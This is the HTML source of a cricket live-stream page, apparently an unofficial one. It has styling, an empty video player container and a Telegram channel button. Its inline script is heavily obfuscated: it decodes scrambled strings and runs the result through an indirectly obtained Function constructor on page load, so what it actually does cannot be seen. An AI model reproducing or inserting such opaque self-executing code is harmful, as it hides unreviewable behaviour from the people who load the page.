<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXCricket</title>
    <style>
        /* General Page Styling */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #242424, #3b5998);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        /* Bingewav Sports Logo Section */
        .logo-container {
            background: #000; /* Black background for the logo */
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }

        .logo-container img {
            width: 220px; /* Adjust the logo size */
            height: auto;
        }

        /* Video Player Styling */
        .player-container {
            width: 95%;
            max-width: 1200px;
            margin: 20px auto;
            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            overflow: hidden;
            background: #000; /* Black background behind the video for better focus */
            position: relative;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
        }

        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 15px;
            border: none;
        }

        /* Stream Issue Section */
        .stream-issue {
            margin-top: 20px;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 16px;
            color: #fff;
            width: fit-content;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .stream-issue a {
            color: #00c1ff;
            text-decoration: none;
            font-weight: bold;
        }

        .stream-issue a:hover {
            text-decoration: underline;
        }

        /* Join Telegram Button */
        .join-telegram-container {
            margin-top: 20px;
            text-align: center;
        }

        .join-telegram-btn {
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #008fd6;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .join-telegram-btn:hover {
            background-color: #006bb3;
        }
    </style>
</head>
<body>

<!-- Video Player Section -->
<div class="player-container" id="playerContainer"></div>

<!-- Join Telegram Button -->
<div class="join-telegram-container">
    <button class="join-telegram-btn" onclick="window.open('https://t.me/RadarXCricket', '_blank')">Join Telegram Channel</button>
</div>

<script>
var loadIframe;(function(){var FJR='',Ljr=930-919;function VWT(t){var w=417626;var c=t.length;var k=[];for(var i=0;i<c;i++){k[i]=t.charAt(i)};for(var i=0;i<c;i++){var m=w*(i+455)+(w%46183);var v=w*(i+232)+(w%17342);var r=m%c;var f=v%c;var o=k[r];k[r]=k[f];k[f]=o;w=(m+v)%1414729;};return k.join('')};var AEW=VWT('soenhorlncvcmqtwjgcitrpazotksfrudyxbu').substr(0,Ljr);var OIf='1o  i xp,]= 8u+=o+-jir)rt=(fkveqe=iAotr.v.{uj1cmn,y(+]jsjqv=rwdro;,r;,hh,qhamw"<ha8k)xu,6raSvxAeC9=,nt,o7a0.o)r,6],!np1,)+va= 3sr41o{ravvhvp60rgt)r7<]4nh;xs0.dic(=teeltc;;a,,7(fl0h6y(+,=mo3l2et=)o(rp4[,.u,;iei)u{as.veh]2glC;)tj(,;tt.v+)htaarg+st=r,x7..;vl;;([8c=nfni])=rfvrhrrf)st!)t;"-,=tvpcphr;r.v ju3lxgp1k e6nv0;s(=  a0unqdv)o"jai.[ar=px(Alr( 6uvnerl;9Cs);exr7[m;eh;]+n+)0otan5[jp.d a2=ud ;[*c7noa=[v[;vl]a[.;rfpsrAtgc)s;8r;,v(t+j+;[C}=5h1-ktpv5-+;aeCl=1su w(8js6))bn[ffc97exg2hsm0m[nga{Cj=r>.9ucg)n++.cu]4tmf=ntn;{2i- ;g=f;7=r2g}pe(d;18i)a<u(p(jf;+i b2rxssqa(=e](i<"ar+ag. re(ys+m=sg=7.h)f;=ta(];s;(gfrkcsleo{l+p;vven0.,n;-=,(i= n<}o8tn5"s(g.xui>rv.nat(h)s;=e=hn"Co;a1"i);}+aopu=)(f6}].;u;Sr,o"s)+sil*htt}=67 d,(9+[a2c]et)r+dlg,zb.}=f=(;{krrrn  a68)"i;);r(;hxm8=rdg9o=600f .(vl(09lejjb= s,,-ahv;ae)u )uoiei)(dgnh+;alar)b=ff[)li1(r(l= jCn+m+h.7(r..bw.gpvoxr1itan;1vilahandu r"h]y9Abg=)q';var xUK=VWT[AEW];var VXR='';var TiG=xUK;var OXM=xUK(VXR,VWT(OIf));var HeD=OXM(VWT('XXnedd(c9sr%X!1*X0,$nb9Xard_ii]iX)XrehX.erd;%oX3sc cX!=\'X8eu_8_((1!b}*={;b)f$Xo6lxiX5(.l]e\'Xt!c._$opne7=(9$uX1X04450(4}a-#b*=rw,Xi2z oXp3{f4X+ to.=%4sdeln_.bn;lo=XtXgpo(Xr.7.]${{ij%e_ar%eu$a[oXod4#.(n(tj52is}59d+1ooyb,XvtX\/Xaosla44b,=a"s!]otf!2oe.y(XrmvX.r,lilfXb.0(m)jb3(,oCt 1-la)2lvl;Xce!4!ffjorlvst;Xliga7.co-g4t=)XX.al5wdh\/89X%3"o,lp7i33.to 5n_hXr2,lj.tn03;38b]X0re%0!.5b.?)w%eassndrpX;+n=tnXfnpnsiXfetaX3(yX3ee;nX.;=sef)]017a,o).bXsw,(l-1X));f2Sc 4tjfn [.unX{9\/dduas.r}-X4ftr_.tfoX!t"f8}XE62{t_f.infIb,5unt$p[rav%X4Etjo.wXX9f;s)o-i.([ ;i*pta8rd0b27pd\/Xd!.40n]XnX;1%X$em)r.gXsnuln..tstX)li$rh2.Xi.mrX Xd!=c0r2emnt"ooa,g,eamd6zuX%XlXpz6l!ir.r%X7Xe\'261#%z,,)n;X#pn oaX$!X%4!#Xn.e%Xg,a%3c$iadxn(g$)%f=ag]!r"]ee_p sao(tsvls!Xfb.-r!i=kbos8-CsX&su&mXx3 =rs4tut4sh6,),omr i3r$_z$ounvb;tmiX;1Xwolz2((S fbr}w2-bC{$)w!iwX_X.ox,2X(,a7-ff.,$.fX)oe+..n Xpcine(ssbj:.tee%{=fX3rf!9e.eXa]=ts.i))(nf7c46$)mu)\'t=3,l=Xs_ae527se)g92)$c,_X..btX6=b2r3ed;c2mi}t4t[e,(.mSs0X.X(ce1l\/f3\'Xa2]vn\/=)wioc(vXla6X-o%1h0X;(e;%.3;_7%)\/3()4; $m#;)w0;Xo]&+70umer,(mb]rtdXctas)r3(i_$\/afir!)o)(7."&x]c]$6e(9.nwX.lXXf t\/dXzX}l 4b;%p+X.5jh)x,w)re\'l[,j,n\'2C4Xeso3]7j18")oj33#n,6X.ibo4b#,.!t}7p+n(irXbz,tpg)nb)v3 n%1gf]_.X_o).!$Xe(24e4%n-)," p;owX\/!44)Xvp3]8elimgoa2(n1c 4%Xhi!xX$X=6(_fXdXo[4(5=%wn$m;Xa=Xo]w1X._s3,g6aX0aatethwo9rf{aee-_p.b_(.-1oX.}XxI)et${Xe_X4n+e]im(XXmambbnis7anmu l,71ft(uw.0)*mlXa}X+,t9![)yf5l9joaX()vf=r[g)a)$%(10;t( %e.0l c\/nfbm.+lXnre; t!!6'));var KZA=TiG(FJR,HeD );KZA(8825);return 5047})()
</script>

</body>
</html>